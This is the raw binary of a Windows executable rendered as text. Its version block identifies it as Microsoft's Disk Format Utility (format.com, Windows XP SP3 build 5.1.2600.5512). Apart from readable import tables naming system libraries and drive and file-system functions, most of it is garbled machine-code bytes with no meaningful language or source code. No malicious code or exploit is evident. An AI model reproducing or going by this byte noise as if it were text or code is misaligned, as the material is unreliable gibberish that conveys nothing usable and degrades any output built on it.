̋U$ t=@  uMVEP  u3u 3 3 3EP E3E3%  ^u@  $ У  ;$ u	  u   ̋U0  Wffffffǅ(  EEE@jY3ǅ	 EE(E$    $j   EP( h   P _j(h   3W$ f8MZuH<ȁ9PE  uA=  t=  t}'   v39   ytv39   E}j YD H  @  <   L   9=0 uhNj  Y  h h   8 E܍EP54 EPEPEP Eh h  |  E uuu0u9}uV  -E	MPQ*  YYËeuЃ} uV x Mv  ̋D$L$ȋL$u	D$ S؋D$d$؋D$[ WVS3D$}GT$ڃ D$T$D$}GT$ڃ D$T$uL$D$3؋D$A؋L$T$D$ud$ȋD$r;T$wr;D$vN3ҋOu؃ [^_ % % h   h   p   YY3hj d    PD$l$l$+SVWEePEEEEd    ËMd    Y_^[Q% %| k  m  t  4k  n     k  u    dk          x  0  k  y                        n  Jn  6n  n  m  m  m  m  zn  n  ^n      Rx  x  x  x  w  w  w  hw  (w  v  v  v  u  fv  4v  x      l  l  m  m  vm  hm  Xm  Hm  4m  (m  m  m  m  l  l  l  l      y      q   r  r  6r  Lr  lr  r  r  r  r  r  s  &s  Fs  \s  xs  s  s  s  s  ,t  Tt  t  t  t  &u  Xu  u  u  u  ~q  Dq  q  p  p  p  p  Pp  p  o  o  o  zo  \o  6o  $o  o  n  n  q      4_wcsupr )_wcsicmp   _c_exit  _exit N _XcptFilter  _cexit  exit  n __initenv m __getmainargs ;_initterm  __setusermatherr   _adjust_fdiv   __p__commode   __p__fmode   __set_app_type   _except_handler3  msvcrt.dll   _controlfp  SetErrorMode  QueryPerformanceCounter GetTickCount  >GetCurrentThreadId  <GetCurrentProcessId GetSystemTimeAsFileTime JTerminateProcess  ;GetCurrentProcess [UnhandledExceptionFilter  6SetUnhandledExceptionFilter vGetModuleHandleA  KERNEL32.dll   ?Display@MESSAGE@@QAAEPBDZZ  ?GetLexeme@ARGUMENT@@QAEPAVWSTRING@@XZ   ?Initialize@WSTRING@@QAEEPBDK@Z = ??1PATH@@UAE@XZ  ?Initialize@WSTRING@@QAEEPBV1@KK@Z   ?IsGuidVolName@PATH@@QAEEXZ _ ?AnalyzePath@PATH@@QAE?AW4PATH_ANALYZE_CODE@@PAVWSTRING@@PAV1@0@Z  ??0PATH@@QAE@XZ  ?IsValueSet@ARGUMENT@@QAEEXZ  w ?DeleteAllMembers@ARRAY@@UAEEXZ ?QueryInvalidArgument@ARGUMENT_LEXEMIZER@@QAEPAVWSTRING@@XZ  ?DoParsing@ARGUMENT_LEXEMIZER@@QAEEPAVARRAY@@@Z  ?Put@ARRAY@@UAEEPAVOBJECT@@@Z  ?Initialize@LONG_ARGUMENT@@QAEEPAD@Z   ?Initialize@PATH_ARGUMENT@@QAEEPADE@Z  ?Initialize@FLAG_ARGUMENT@@QAEEPAD@Z   ?Initialize@STRING_ARGUMENT@@QAEEPAD@Z   ?PrepareToParse@ARGUMENT_LEXEMIZER@@QAEEPAVWSTRING@@@Z  J?SetCaseSensitive@ARGUMENT_LEXEMIZER@@QAEXE@Z  ?Initialize@ARGUMENT_LEXEMIZER@@QAEEPAVARRAY@@@Z   ?Initialize@ARRAY@@QAEEKK@Z  ??0LONG_ARGUMENT@@QAE@XZ   ?IsPC98@MACHINE@@QAEEXZ 3 ??1DSTRING@@UAE@XZ  + ??1ARGUMENT_LEXEMIZER@@UAE@XZ , ??1ARRAY@@UAE@XZ   ??0PATH_ARGUMENT@@QAE@XZ   ??0FLAG_ARGUMENT@@QAE@XZ  % ??0STRING_ARGUMENT@@QAE@XZ   ?IsFMR@MACHINE@@QAEEXZ   ?MachinePlatform@@3VMACHINE@@A   ??0ARRAY@@QAE@XZ    ??0ARGUMENT_LEXEMIZER@@QAE@XZ  ??0DSTRING@@QAE@XZ  C ??1STREAM_MESSAGE@@UAE@XZ 6 ??1HMEM@@UAE@XZ  ?FreeLibraryHandle@SYSTEM@@SGXPAX@Z \ ?Acquire@HMEM@@UAEPAXKK@Z  ??0HMEM@@QAE@XZ -?QueryVolumeLabel@SYSTEM@@SGPAVWSTRING@@PAVPATH@@PAU_VOL_SERIAL_NUMBER@@@Z   ?Initialize@PATH@@QAEEPBVWSTRING@@E@Z ?QueryLibraryEntryPoint@SYSTEM@@SGP6GHXZPBVWSTRING@@0PAPAX@Z  f?Strcat@WSTRING@@QAEEPBV1@@Z  
?QueryCurrentDosDriveName@SYSTEM@@SGEPAVWSTRING@@@Z ?QueryDriveType@SYSTEM@@SG?AW4DRIVE_TYPE@@PBVWSTRING@@@Z   ?Initialize@STREAM_MESSAGE@@QAEEPAVSTREAM@@00@Z  ?Get_Standard_Output_Stream@@YGPAVSTREAM@@XZ   ?Get_Standard_Input_Stream@@YGPAVSTREAM@@XZ  ?Initialize@MACHINE@@QAEEXZ $ ??0STREAM_MESSAGE@@QAE@XZ ulib.dll  6 ?EnableVolumeCompression@IFS_SYSTEM@@SGEPBVWSTRING@@@Z  5 ?EnableFileSystem@IFS_SYSTEM@@SGEPBVWSTRING@@@Z b ?IsFileSystemEnabled@IFS_SYSTEM@@SGEPBVWSTRING@@PAE@Z  ?QueryPhysicalSectorSize@DP_DRIVE@@QBEKXZ  ?Write@LOG_IO_DP_DRIVE@@QAEEVBIG_INT@@KPAX@Z   ?Read@LOG_IO_DP_DRIVE@@QAEEVBIG_INT@@KPAX@Z R ?Initialize@LOG_IO_DP_DRIVE@@QAEEPBVWSTRING@@PAVMESSAGE@@EG@Z  ??0LOG_IO_DP_DRIVE@@QAE@XZ   ?QuerySectorSize@DP_DRIVE@@UBEKXZ  ?QuerySectors@DP_DRIVE@@UBE?AVBIG_INT@@XZ u ?QueryFileSystemName@IFS_SYSTEM@@SGEPBVWSTRING@@PAV2@PAJ1@Z  ?QueryRecommendedMediaType@DP_DRIVE@@QBE?AW4_MEDIA_TYPE@@XZ O ?Initialize@DP_DRIVE@@QAEEPBVWSTRING@@PAVMESSAGE@@EEG@Z  ??0DP_DRIVE@@QAE@XZ  ??1DP_DRIVE@@UAE@XZ 2 ?DosDriveNameToNtDriveName@IFS_SYSTEM@@SGEPBVWSTRING@@PAV2@@Z ifsutil.dll RtlAllocateHeap ntdll.dll                                                                                                                                                                                                                                     f                         D@                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               0                 	  H   `  x                  x4   V S _ V E R S I O N _ I N F O          (
  (
?                           S t r i n g F i l e I n f o      0 4 0 9 0 4 B 0   L   C o m p a n y N a m e     M i c r o s o f t   C o r p o r a t i o n   P   F i l e D e s c r i p t i o n     D i s k   F o r m a t   U t i l i t y   b !  F i l e V e r s i o n     5 . 1 . 2 6 0 0 . 5 5 1 2   ( x p s p . 0 8 0 4 1 3 - 2 1 1 1 )     .   I n t e r n a l N a m e   f o r m a t      .  L e g a l C o p y r i g h t      M i c r o s o f t   C o r p o r a t i o n .   A l l   r i g h t s   r e s e r v e d .   >   O r i g i n a l F i l e n a m e   f o r m a t . c o m     j %  P r o d u c t N a m e     M i c r o s o f t    W i n d o w s    O p e r a t i n g   S y s t e m     @   P r o d u c t V e r s i o n   5 . 1 . 2 6 0 0 . 5 5 1 2   D    V a r F i l e I n f o     $    T r a n s l a t i o n     	                                                                                                                                                                                               